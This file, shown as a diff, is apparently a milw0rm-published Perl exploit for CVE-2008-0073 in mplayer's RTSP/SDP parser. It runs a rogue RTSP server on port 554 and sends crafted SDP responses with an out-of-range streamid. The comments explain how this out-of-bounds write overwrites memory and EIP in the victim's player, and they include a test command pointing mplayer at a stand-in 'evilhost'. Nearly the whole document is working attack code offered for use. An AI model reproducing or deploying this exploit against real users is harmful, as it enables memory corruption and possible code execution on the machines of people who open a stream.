@@ -1,0 +1,131 @@
+#!/usr/bin/perl
+
+# Huston, mplayer got some vulns!  :( 
+# CVE-2008-0073 also apply to mplayer and vlc with some distinctions.
+#
+# Assuming kernel.va_randomize=0 this overwrite EIP with a "stream" structure on my box.
+#
+# The first element of the "stream" structure is a user-supplied buffer so it is not really useful to overwrite 
+# EIP, let's find the right target: we can overwrite every memory location beyond the desc->stream pointer and 
+# some before it.
+#
+# Vulnerable code:
+# sdpplin_parse_stream()
+#  desc->stream_id=atoi(buf); 
+# spplin_parse()
+#  desc->stream[stream->stream_id]=stream; 
+#
+# Test:
+# - mplayer rtsp://evilhost/evil.rm 
+# eax    0xa0737008  // pointer to desc->stream 
+# edx    0x0495badd  // "streamid" value
+# edi    0x089b59e8  // pointer to stream 
+#
+# <sdpplin_parse+731>: mov    DWORD PTR [eax+edx*4],edi 
+
+use warnings;
+use strict;
+use IO::Socket;
+
+my $evil_num	=  "127467297"; # this is a 4byte offset from desc->stream
+		 
+
+my $rtp_hello = "RTSP/1.0 200 OK\r\n".
+		"CSeq: 1\r\n".
+		"Date: Thu, 20 Mar 2008 20:07:39 GMT\r\n".
+		"Server: RealServer Version 9.0.2.794 (sunos-5.8-sparc-server)\r\n".
+		"Public: OPTIONS, DESCRIBE, ANNOUNCE, PLAY, SETUP, GET_PARAMETER, SET_PARAMETER, TEARDOWN\r\n".
+		"RealChallenge1: de6654ba4935b8b9d8af3ba8d6f8e71c\r\n".
+		"StatsMask: 3\r\n\r\n";
+
+my $rtp_evil =	"RTSP/1.0 200 OK\r\n".
+		"CSeq: 2\r\n".
+		"Date: Thu, 20 Mar 2008 20:08:34 GMT\r\n".
+		"vsrc: http://0.00.00.00:31337\r\n".
+		"Content-base: rtsp://0.00.00.00:554/bu.rm\r\n".
+		"ETag: 55370-2\r\n".
+		"Session: 93033-2\r\n".
+		"Content-type: application/sdp\r\n".
+		"Content-length: 677\r\n\r\n".
+
+		"v=0\r\n".
+		"o=-1028652722 1028652722 IN IP4 0.00.00.00\r\n".
+		"s=realmp3\r\n".
+		"i=<No author> <No copyright>\r\n".
+		"c=IN IP4 0.0.0.0\r\n".
+		"t=0 0\r\n".
+		"a=SdpplinVersion:1610645242\r\n".
+		"a=StreamCount:integer;\"1166000000\"\r\n".
+		"a=Title:buffer;\"dtFabH2rNoP=\"\r\n".
+		"a=range:npt=0-39.471000\r\n".
+		"m=audio 0 RTP/AVP 101\r\n". 	# this is referenced by "stream" 
+		"b=AS:128\r\n".
+		"a=control:streamid=$evil_num\r\n".
+		"a=range:npt=0-39.471000\r\n".
+		"a=length:npt=39.471000\r\n".
+		"a=rtpmap:101 X-MP3-draft-00/1000\r\n".
+		"a=mimetype:string;\"audio/X-MP3-draft-00\"\r\n".
+		"a=StartTime:integer;0\r\n".
+		"a=AvgBitRate:integer;128000\r\n".
+		"a=SampleRate:integer;44100\r\n".
+		"a=AvgPacketSize:integer;417\r\n".
+		"a=Preroll:integer;1000\r\n".
+		"a=NumChannels:integer;2\r\n".
+		"a=MaxPacketSize:integer;1024\r\n".
+		"a=ASMRuleBook:string;\"AverageBandwidth=128000, AverageBandwidthStd=0, Priority=9;\"\r\n";
+
+
+	
+my @resps = (	$rtp_hello,	
+		$rtp_evil,
+	
+		"RTSP/1.0 200 OK\r\n".
+		"CSeq: 3\r\n".
+		"Date: Sat, 22 Mar 2008 20:45:47 GMT\r\n".
+		"Session: 93033-2\n\r".
+		"Reconnect: true\n\r".
+		"RealChallenge3: 2520b5cd0e5e5622ec25f563312aba3e4f213d09,sdr=2b05ef3b\n\r".
+		"RDTFeatureLevel: 2\r\n".
+		"Transport: x-pn-tng/tcp;interleaved=0\r\n\r\n",
+
+		"RTSP/1.0 200 OK\r\n".
+		"CSeq: 4\r\n".
+		"Date: Sat, 22 Mar 2008 15:11:06 GMT\r\n".
+		"Session: 93033-2\r\n\r\n",
+
+		"RTSP/1.0 200 OK\r\n".
+		"CSeq: 5\r\n".
+		"Date: Sat, 22 Mar 2008 15:11:06 GMT".
+		"RTP-Info: url=rtsp://0.00.00.00/bu.rm\r\n\r\n",
+		);
+
+
+my $sock = IO::Socket::INET->new(LocalAddr => '0.0.0.0', LocalPort => '554', Listen => 1, Reuse => 1);
+
+while(my $csock = $sock->accept)
+{
+	foreach my $resp(@resps)
+	{
+		my $buf = read_from_sock($csock);
+		print $csock $resp;
+	}
+}
+
+
+sub read_from_sock()
+{
+	my ($sock) = @_;
+
+	my $buffer = "";
+
+	while(<$sock>)
+	{
+		return $buffer if /^\r\n$/;
+		$buffer .= $_;
+	}
+
+	return $buffer;
+
+}
+
+# milw0rm.com [2008-03-25]
